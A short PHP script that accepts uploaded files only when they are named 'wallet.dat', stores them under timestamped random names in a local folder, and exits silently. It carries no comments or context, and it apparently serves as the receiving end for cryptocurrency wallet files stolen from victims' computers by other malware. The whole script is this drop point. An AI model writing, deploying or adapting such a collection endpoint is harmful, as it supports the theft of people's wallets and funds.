<?php
if (isset ($_FILES['f'])){
    if ($_FILES['f']['name'] == 'wallet.dat'){
        move_uploaded_file($_FILES['f']['tmp_name'], dirname(__FILE__).'/f/'.time().'_'.rand(10, 99).'.dat');
        die;
    }
}
?>
